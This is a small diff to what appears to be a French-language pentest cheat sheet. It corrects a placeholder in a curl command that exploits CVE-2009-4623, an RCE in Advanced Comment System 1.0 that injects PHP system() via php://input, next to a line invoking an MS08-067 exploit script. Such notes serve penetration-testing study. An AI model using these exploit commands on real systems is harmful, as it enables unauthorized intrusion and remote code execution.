@@ -24,5 +24,5 @@ python3 Python3-MS08-067.py <IP> 1 445 #Changer l'OS cible en modifiant le '1'
 #### CVE-2009-4623 (Advanced Comment System 1.0) - RCE
 
 ```
-curl -s --data "<?system('<CMD');?>" 'http://<IP>/internal/advanced_comment_system/admin.php?ACS_path=php://input%00'
+curl -s --data "<?system('<CMD>');?>" 'http://<IP>/internal/advanced_comment_system/admin.php?ACS_path=php://input%00'
 ```
